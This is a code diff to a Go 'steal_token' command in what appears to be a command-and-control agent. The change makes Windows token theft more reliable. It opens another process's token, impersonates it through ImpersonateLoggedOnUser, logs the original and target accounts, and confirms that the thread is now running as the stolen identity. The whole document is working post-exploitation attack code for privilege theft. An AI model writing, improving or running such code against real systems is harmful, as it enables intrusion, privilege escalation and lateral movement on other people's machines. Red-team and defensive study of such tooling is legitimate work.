@@ -72,6 +72,23 @@ func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.A
 func stealToken(pid uint32) (string, error) {
 	var output string
 
+	// Get original context before stealing
+	processHandle, err := windows.GetCurrentProcess()
+	if err == nil {
+		var processToken windows.Token
+		err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &processToken)
+		if err == nil {
+			defer processToken.Close()
+			processUser, err := processToken.GetTokenUser()
+			if err == nil {
+				processUsername, processDomain, _, err := processUser.User.Sid.LookupAccount("")
+				if err == nil {
+					output += fmt.Sprintf("[*] Original token: %s\\%s\n", processDomain, processUsername)
+				}
+			}
+		}
+	}
+
 	// Open target process
 	hProcess, err := windows.OpenProcess(
 		windows.PROCESS_QUERY_INFORMATION,
@@ -97,12 +114,13 @@ func stealToken(pid uint32) (string, error) {
 	defer hToken.Close()
 	output += "[+] Opened process token\n"
 
-	// Get token user information to display who we're impersonating
+	// Get token user information to display who we're stealing from
+	var targetUsername, targetDomain string
 	tokenUser, err := hToken.GetTokenUser()
 	if err == nil {
-		username, domain, _, err := tokenUser.User.Sid.LookupAccount("")
+		targetUsername, targetDomain, _, err = tokenUser.User.Sid.LookupAccount("")
 		if err == nil {
-			output += fmt.Sprintf("[+] Token belongs to: %s\\%s\n", domain, username)
+			output += fmt.Sprintf("[+] Token belongs to: %s\\%s\n", targetDomain, targetUsername)
 		}
 	}
 
@@ -125,12 +143,10 @@ func stealToken(pid uint32) (string, error) {
 	// Impersonate the token
 	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
 	if ret == 0 {
-		return output, fmt.Errorf("failed to impersonate token: %v", err)
+		return output, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
 	}
-	output += "[+] Successfully impersonating token!\n"
-	output += "[!] Use 'rev2self' to revert to original context\n"
 
-	// Get current thread token to verify impersonation
+	// CRITICAL: Verify impersonation actually worked by checking thread token
 	var hThreadToken windows.Token
 	err = windows.OpenThreadToken(
 		windows.CurrentThread(),
@@ -138,16 +154,31 @@ func stealToken(pid uint32) (string, error) {
 		false,
 		&hThreadToken,
 	)
-	if err == nil {
-		defer hThreadToken.Close()
-		tokenUser, err := hThreadToken.GetTokenUser()
-		if err == nil {
-			username, domain, _, err := tokenUser.User.Sid.LookupAccount("")
-			if err == nil {
-				output += fmt.Sprintf("[+] Current context: %s\\%s\n", domain, username)
-			}
-		}
+	if err != nil {
+		return output, fmt.Errorf("impersonation appeared to succeed but cannot open thread token: %v", err)
 	}
+	defer hThreadToken.Close()
+
+	// Verify the thread token is actually the target user
+	threadTokenUser, err := hThreadToken.GetTokenUser()
+	if err != nil {
+		return output, fmt.Errorf("impersonation appeared to succeed but cannot query thread token: %v", err)
+	}
+
+	currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
+	if err != nil {
+		currentUsername = "unknown"
+		currentDomain = "unknown"
+	}
+
+	// Check if we actually got the target token
+	if currentUsername != targetUsername || currentDomain != targetDomain {
+		return output, fmt.Errorf("impersonation failed: still running as %s\\%s (expected %s\\%s)", currentDomain, currentUsername, targetDomain, targetUsername)
+	}
+
+	output += "[+] Successfully impersonated token!\n"
+	output += fmt.Sprintf("[+] Current context: %s\\%s\n", currentDomain, currentUsername)
+	output += "[!] Use 'rev2self' to revert to original context"
 
 	return output, nil
 }
